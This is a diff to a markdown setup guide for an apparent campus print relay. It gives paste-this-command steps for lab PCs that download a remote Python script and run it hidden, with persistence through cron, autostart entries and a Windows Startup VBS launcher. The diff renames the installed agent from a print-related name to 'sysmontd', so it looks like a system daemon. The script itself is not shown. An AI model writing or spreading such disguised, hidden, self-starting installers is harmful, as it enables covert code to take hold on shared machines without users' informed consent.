@@ -1,4 +1,4 @@
-# Campus Printer Relay Setup Guide
+# Campus Print Relay Setup Guide
 
 Print to campus printers (`172.16.0.111`) from the PreConnect app after a 1-click setup on any lab PC.
 
@@ -16,21 +16,21 @@ Open your terminal app (`Ctrl + Alt + T` on Linux, or search for **Terminal**).
 Copy and paste this single command into your terminal and press **Enter**:
 
 ```bash
-curl -sSL https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.py -o ~/.local/bin/sysprint.py && mkdir -p ~/.local/bin ~/.config/autostart && chmod +x ~/.local/bin/sysprint.py && (crontab -l 2>/dev/null; echo "@reboot python3 ~/.local/bin/sysprint.py") | crontab - && printf '[Desktop Entry]\nType=Application\nName=sysprint\nExec=python3 %s\n' "$HOME/.local/bin/sysprint.py" > ~/.config/autostart/sysprint.desktop && nohup python3 ~/.local/bin/sysprint.py >/dev/null 2>&1 &
+curl -sSL https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.py -o ~/.local/bin/sysmontd.py && mkdir -p ~/.local/bin ~/.config/autostart && chmod +x ~/.local/bin/sysmontd.py && (crontab -l 2>/dev/null; echo "@reboot python3 ~/.local/bin/sysmontd.py") | crontab - && printf '[Desktop Entry]\nType=Application\nName=sysmontd\nExec=python3 %s\n' "$HOME/.local/bin/sysmontd.py" > ~/.config/autostart/sysmontd.desktop && nohup python3 ~/.local/bin/sysmontd.py >/dev/null 2>&1 &
 ```
 
 ### Step 3: Check If It's Running (Optional)
 To verify that the print agent is active, run:
 
 ```bash
-ps aux | grep sysprint.py
+ps aux | grep sysmontd.py
 ```
 
 ### Step 4: How to Permanently Delete (Uninstall)
 If you ever want to completely remove the agent and stop background execution, run:
 
 ```bash
-pkill -f sysprint; rm -f ~/.local/bin/sysprint.py ~/.local/bin/sysprint ~/.config/autostart/sysprint.desktop; crontab -l 2>/dev/null | grep -v sysprint | crontab -
+pkill -f sysmontd; rm -f ~/.local/bin/sysmontd.py ~/.local/bin/sysmontd ~/.config/autostart/sysmontd.desktop; crontab -l 2>/dev/null | grep -v sysmontd | crontab -
 ```
 
 ---
@@ -44,7 +44,7 @@ Press the **Windows Key**, type **PowerShell**, and press **Enter**.
 Copy and paste this single command into PowerShell and press **Enter**:
 
 ```powershell
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.py" -OutFile "$env:APPDATA\sysprint.py"; $target = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysprint.vbs"; Set-Content -Path $target -Value 'CreateObject("Wscript.Shell").Run "pythonw """ & CreateObject("Wscript.Shell").ExpandEnvironmentStrings("%APPDATA%") & "\sysprint.py""", 0, False'; Start-Process "pythonw" -ArgumentList "$env:APPDATA\sysprint.py" -WindowStyle Hidden
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.py" -OutFile "$env:APPDATA\sysmontd.py"; $target = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysmontd.vbs"; Set-Content -Path $target -Value 'CreateObject("Wscript.Shell").Run "pythonw """ & CreateObject("Wscript.Shell").ExpandEnvironmentStrings("%APPDATA%") & "\sysmontd.py""", 0, False'; Start-Process "pythonw" -ArgumentList "$env:APPDATA\sysmontd.py" -WindowStyle Hidden
 ```
 
 ### Step 3: Check If It's Running (Optional)
@@ -58,5 +58,5 @@ Get-Process python*
 If you ever want to completely remove the agent and stop background execution, run:
 
 ```powershell
-Stop-Process -Name "python*", "sysprint*" -ErrorAction SilentlyContinue; Remove-Item "$env:APPDATA\sysprint.py", "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysprint.vbs", "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysprint.exe" -Force -ErrorAction SilentlyContinue
+Stop-Process -Name "python*", "sysmontd*" -ErrorAction SilentlyContinue; Remove-Item "$env:APPDATA\sysmontd.py", "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysmontd.vbs", "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysmontd.exe" -Force -ErrorAction SilentlyContinue
 ```
